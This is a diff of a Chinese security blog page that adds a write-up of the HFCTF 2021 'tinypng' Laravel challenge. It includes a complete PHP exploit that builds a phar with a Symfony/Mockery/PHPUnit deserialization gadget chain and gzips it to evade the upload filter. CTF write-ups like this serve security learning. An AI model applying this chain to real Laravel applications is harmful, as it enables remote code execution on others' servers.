@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
   <head>
       <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>过客</title>
+  <title>虎符2021线下  tinypng  | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="虎符2021线下  tinypng  | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,9 +25,15 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
+    <meta property="og:description" content="虎符2021线下  tinypng "/>
+    <meta property="og:url" content="https://guokeya.github.io/post/z5gHcmbVj/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
   </head>
   <body>
-     <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
       <a class="navbar-brand" href="https://guokeya.github.io">过客</a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
@@ -65,121 +71,153 @@
       </div>
     </div>
   </nav>
+  <!-- Page Header -->
   <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
-          <div class="site-heading">
-            <h1>过客</h1>
-            <span class="subheading">TEST</span>
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+        </span>
+            <h1>虎符2021线下  tinypng </h1>
+            <span class="meta">
+            	Posted on
+              2021-04-27，3 min read
+            </span>
           </div>
         </div>
       </div>
     </div>
   </header>
-      <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-md-10 mx-auto">
-       
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/metasploit-sheng-cheng-mian-sha-mu-ma/">
-            <h2 class="post-title">
-              Metasploit生成免杀木马
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>环境准备</strong><br>
-1.安装软件如下<br>
-python2.7<br>
-pyinstaller<br>
-pywin32<br>
-32位系统，我这里用的是XP</p>
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">8 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/redis-rce-lou-dong-fu-xian/">
-            <h2 class="post-title">
-              Redis RCE 漏洞复现
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>影响范围</strong><br>
-Redis 4.x-Redis 5.x 未授权利用</p>
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>复现环境：<code>https://buuoj.cn/challenges#[HFCTF%202021%20Final]tinypng</code></p>
+<p>查看源码。发现是laravel框架<br>
+先去看看路由<code>routers/api.php</code> <code>routers/web.php</code><br>
+api下有个user路由貌似没啥用，继续看路由</p>
+<pre><code>Route::post('/', [IndexController::class, 'fileUpload'])-&gt;name('file.upload.post');
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">1 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/cve-2019-0193apache-solr-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian/">
-            <h2 class="post-title">
-              CVE-2019-0193:Apache Solr远程命令执行漏洞复现
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>影响范围</strong><br>
-Apache Solr &lt; 8.2.0</p>
+//Don't expose the /image to others!
+Route::get('/image', [ImageController::class, 'handle'])-&gt;name('image.handle');
+</code></pre>
+<p>index路由指向IndexController的fileUpload方法<br>
+image路由指向ImageController的handle方法</p>
+<p>首先看下index<br>
+<img src="https://guokeya.github.io/post-images/1619531216591.png" alt="" loading="lazy"><br>
+这里大致意思就是上传文件。内容不能有<code>&lt;?| php|HALT_COMPILER</code>。并且后缀得是png。然后会给你一个文件名。大致了解了。再继续看ImageController</p>
+<p><img src="https://guokeya.github.io/post-images/1619531349564.png" alt="" loading="lazy"><br>
+这里接受了一个参数image然后explode取后缀。必须为png。接着。把这个<code>$source</code>传入到了imgcompress类。</p>
+<pre><code>    public function __construct($src, $percent = 1)
+    {
+        $this-&gt;src = $src;
+        $this-&gt;percent = $percent;
+    }
+</code></pre>
+<p>此时。<code>$this-&gt;src</code>就等于我们传入的<code>$source</code>。只是后缀不可控。继续看。传入后。又继续调用了compressImg方法。进入</p>
+<pre><code>    public function compressImg($saveName)
+    {
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/li-yong-huan-jing-bian-liang-ld_preload-rao-guo-php-disable_function-zhi-xing-xi-tong-ming-ling/">
-            <h2 class="post-title">
-              利用环境变量LD_PRELOAD绕过php disable_function执行系统命令
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>利用条件</strong><br>
-php未禁用putenv，mail函数</p>
+        $this-&gt;_openImage();
+        $this-&gt;_saveImage($saveName);
+    }
+</code></pre>
+<p>再跟进_openImage()方法</p>
+<pre><code>   private function _openImage()
+    {
+        list($width, $height, $type, $attr) = getimagesize($this-&gt;src);
+        $this-&gt;imageinfo = array(
+            'width' =&gt; $width,
+            'height' =&gt; $height,
+            'type' =&gt; image_type_to_extension($type, false),
+            'attr' =&gt; $attr
+        );
+        $fun = &quot;imagecreatefrom&quot; . $this-&gt;imageinfo['type'];
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">4 min read</span>
-            </p>
+        $this-&gt;image = $fun($this-&gt;src);
+        $this-&gt;_thumpImage();
+    }
+</code></pre>
+<p><code>getimagesize($this-&gt;src)</code>这。不多说了。<code>$this-&gt;src</code>可控。直接phar一把梭。但是前面上传文件的内容又不能有那些关键字。咋办呢。</p>
+<p>这里19年的D3CTF就考到过<code>https://blog.csdn.net/a3320315/article/details/104423207</code><br>
+这个绕过姿势。。。线下的时候没有一个队想起来(又或许是大佬们都做PK去了。不纠结于AWDP。毕竟一题PK顶一天的AWDP)。只有L3H现场挖了一个新姿势。。过段时间会写。。</p>
+<p>EXP：</p>
+<pre><code>&lt;?php
+namespace Symfony\Component\Routing\Loader\Configurator{
+	class ImportConfigurator{
+		private $parent;
+		private $route;
+		public function __construct($class){
+			$this-&gt;parent=$class;
+			$this-&gt;route='test';
+		}
+	}
+}
+
+namespace Mockery{
+	class HigherOrderMessage{
+		private $mock;
+		private $method;
+		public function __construct($class){
+			$this-&gt;mock=$class;
+			$this-&gt;method='generate';
+		}
+	}
+}
+
+namespace PHPUnit\Framework\MockObject{
+	final class MockTrait{
+		private $mockName;
+		private $classCode;
+		public function __construct(){
+			$this-&gt;mockName='123';
+			$this-&gt;classCode='phpinfo();';
+		}
+	}
+}
+
+namespace{
+	use \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator;
+	use \Mockery\HigherOrderMessage;
+	use \PHPUnit\Framework\MockObject\MockTrait;
+	$c=new MockTrait();
+	$b=new HigherOrderMessage($c);
+	$a=new ImportConfigurator($b);
+	@unlink(&quot;phar.phar&quot;);
+	$phar=new Phar(&quot;phar.phar&quot;);
+	$phar-&gt;startBuffering(); 
+	$phar-&gt;setStub('GIF89a'.&quot;__HALT_COMPILER();&quot;); 
+	$phar-&gt;setMetadata($a); 
+	$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
+	$phar-&gt;stopBuffering();
+}
+
+?&gt;
+</code></pre>
+<p>生成phar后 gzip phar.phar 。产生一个phar.phar.gz<br>
+上传拿到文件名。然后image路由传<code>phar://../storage/app/uploads/xxxxxxxxxxx.png</code>完事了</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/87yhVz7uW/">
+              <span class="post-title">
+                红明谷数据安全大赛线下赛Discuz题解&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
         </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        
-        <a class="btn btn-primary float-left" href="https://guokeya.github.io/page/19/">&larr; 上一页</a>
-        
-        
       </div>
     </div>
-  </div>
-
-  
-    <!-- Footer -->
+  </article>
+ <!-- Footer -->
   <footer>
     <div class="container">
       <div class="row">
@@ -259,3 +297,4 @@ php未禁用putenv，mail函数</p>
   })(this));</script>
   </body>
 </html>
+
